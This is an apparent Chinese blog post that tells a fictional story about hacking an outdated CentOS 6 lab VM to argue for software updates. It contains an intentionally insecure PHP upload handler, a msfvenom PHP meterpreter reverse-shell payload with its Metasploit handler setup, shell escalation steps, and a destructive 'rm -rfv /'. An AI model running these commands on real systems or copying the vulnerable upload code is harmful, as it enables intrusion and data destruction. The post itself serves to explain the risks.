# 攻击 CentOS6 虚拟机


> 虽然存在渗透过程，但是本篇主题不是渗透，请理性阅读。

## 序

最近总听到一些声音。

一些关于软件更新的、不同的声音。

一边说：在某些情况下，更新不好，会带来不必要的工作量，甚至重写

另一边说：持续不断的更新才能带来更好的体验

我不知道哪一边是对的，但有点好奇

我好奇如果不更新会怎样，所以我做了这件事：用虚拟机模拟一个商业公司的服务器，系统为 CentOS 6，尝试使用一些工具试着去攻击。

只是想模拟一家公司在 2020 年使用 CentOS 6.0 被黑客盯上了会怎么样。

## 模拟环境

> 攻击者平台: Arch Linux
>
> IP: 192.168.0.109
>
> 受害平台: CentOS 6.1 on VirtualBox
>
> IP: 192.168.0.116

**假如**这是一家由非技术人员领导技术人员的公司，很长一段时间没有更新过开发时使用的软件（包括开发机、服务器的操作系统）

我们将这个虚拟机想象为他们的服务器，然后进行一些攻击测试。

由于这家公司的管理层是非技术人员，因此服务器的软件不仅版本老旧，且缺乏防御措施。

外加公司有点不尽人意的工时，程序员们都以“完成任务”的摸鱼态度工作，导致后端 PHP 写成了这样
```php
<?php
if ($_FILES["file"]["error"] > 0)
{
    echo "错误：" . $_FILES["file"]["error"] . "<br>";
}
else
{
    echo "上传文件名: " . $_FILES["file"]["name"] . "<br>";
    echo "文件类型: " . $_FILES["file"]["type"] . "<br>";
    echo "文件大小: " . ($_FILES["file"]["size"] / 1024) . " kB<br>";
    echo "文件临时存储的位置: " . $_FILES["file"]["tmp_name"];
    move_uploaded_file($_FILES["file"]["tmp_name"], "upload/" . $_FILES["file"]["name"]);
    echo "文件存储在: " . "upload/" . $_FILES["file"]["name"];
}
?>
```

> 由于条件有限，只能模拟到这个程度，但我个人认为~~足以进行抽象测试了~~(逃

## 攻击过程

总有人喜欢搞破坏，一名黑客对服务器进行了扫描... 
```bash
$ sudo nmap -O -v 192.168.0.116
```

结果是这样的
```txt
Nmap scan report for 192.168.0.116
Host is up (0.00028s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
MAC Address: 08:00:27:B7:2E:E5 (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 2.6.X|3.X
OS CPE: cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3
OS details: Linux 2.6.32 - 3.10
Uptime guess: 49.708 days (since Sat Aug  8 02:56:12 2020)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

Read data files from: /usr/bin/../share/nmap
OS detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 2.13 seconds
           Raw packets sent: 1023 (45.806KB) | Rcvd: 1015 (41.286KB)
```

他惊讶地发现内核版本居然才 `2.6.32`，这样的事他还是第一次见。 

除此之外，开放的端口有 SSH 、 HTTP ，这给了他很好的机会。

他试图访问了网站，在网站上发现了一个文件上传点。

![](/img/2020-09-26_21-18.png)

抱着试试看的态度，用 msf 生成了一个 payload
```bash
$ msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.0.109 LPORT=4444 -o shell.php
```

选择了文件，点击上传惊奇地发现，不止上传成功，还被告知了位置
![](/img/2020-09-26_21-22.png)

于是他启动了 `msfconsole`
```bash
$ msfconsole
```
并使用  `exploit/multi/handler` 这个模块
```txt
msf5 > use exploit/multi/handler 
```
依次设置好参数
```txt
msf5 exploit(multi/handler) > set LHOST 192.168.0.109
```

```txt
msf5 exploit(multi/handler) > set LPORT 4444
```

```txt
set payload php/meterpreter/reverse_tcp
```

最后一步就是运行模块了，
```txt
msf5 exploit(multi/handler) > run
```

然后 msf 开始监听。
```txt

[*] Started reverse TCP handler on 192.168.0.109:4444 

```

这时他将提示出的文件地址和链接改一下，并访问

>`http://192.168.0.116/upload/shell.php`

msf 立刻就有了结果，可想而知，服务器的安全措施有多差

```txt
[*] Started reverse TCP handler on 192.168.0.109:4444 
[*] Sending stage (38288 bytes) to 192.168.0.116
[*] Meterpreter session 1 opened (192.168.0.109:4444 -> 192.168.0.116:52350) at 2020-09-26 21:33:06 +0800

meterpreter > 
```

现在他开始获取系统简要信息
* 系统、内核版本
```txt
meterpreter > sysinfo
Computer    : localhost
OS          : Linux localhost 2.6.32-754.33.1.el6.x86_64 #1 SMP Tue Aug 25 15:29:40 UTC 2020 x86_64
Meterpreter : php/linux
meterpreter > cat /etc/issue
CentOS release 6.10 (Final)
Kernel \r on an \m
```
* 当前控制的用户权限
```txt
meterpreter > getuid
Server username: apache (48)
```

权限还是很低的，尽管无法做一些让公司损失大的事情，但至少能够偷窥和搞破坏了，不过黑客会就此满足吗？ 答案是不会，因为他还想要提权，获取 root 权限，这样便能为所欲为了。

由于这台服务器的系统与内核过于老旧，大多数复现漏洞的代码要么只在3.x 以上的内核版本中有效，要么无法编译。

看起来他需要想想其他办法。

他在白天骑着摩托穿街过巷送外卖，夜晚则是游走网络间的黑客。

一次偶然的机会，他去送那个公司的员工订的外卖，进入办公区时，无意之间看到贴在显示器上的便签。

上面写着一些数字和字母，也许是什么有用的东西。

趁着员工们用餐，他用手机偷偷将便签拍了下来便离开了。

比较巧的是，这张便签是刚换的密码，需要再隔一段时间才会更改。

下班后回到终端，尝试着用偷窥来的密码直接登陆 root 
```txt
meterpreter > shell
Process 1376 created.
Channel 2 created.
```
获得交互 shell
```txt
/bin/sh -i
sh: no job control in this shell
sh-4.1$ python -c 'import pty;pty.spawn("/bin/bash")'
python -c 'import pty;pty.spawn("/bin/bash")'
bash-4.1$ 
```
进行登录
```txt
bash-4.1$ su root
su root
Password: ************

[root@localhost upload]# 
```

可见，一口气便登录成功，root 权限到了他的手里。

```txt
[root@localhost upload]# whoami
whoami
root
[root@localhost upload]# id
id
uid=0(root) gid=0(root) groups=0(root) context=unconfined_u:system_r:httpd_t:s0
[root@localhost upload]# 
```

接下来他便可以为所欲为了..

对，他最后进行了删库
```txt
[root@localhost upload]# rm -rfv /
```
最后导致公司损失巨大..

## 结语

虽然以上的故事纯属虚构，攻击也只是在模拟环境进行的。

但却值得我们思考，就我们能看到的来看...

* 系统不更新容易被攻击
* 代码不更新容易出漏洞
* 密码更新太慢容易泄露
* 漏洞以更新来修复，不修则被利用

而我们看不到的...

软件终究是人所创造的，人尚无完美者，需要不断反省自己，思考自己，何况是所造之物？

不论作为用户开始开发者，更新自己应该更新的东西是再正常不过的事情了，只不过有快慢之别，但不论快慢，总得前进，迟早都要往前走的。

而不能站立不动甚至往回走。

物之更新如人之反省，人不知反省，前途渺茫，物不被更新，受人遗弃。

甚至是，像看到我刚刚讲的笑话那样，被一个送外卖的脚本小子轻松破坏掉了..

以上，只是个人想法，若有不当之处，请在下面的评论插件中 ~~喷我~~ 纠正。


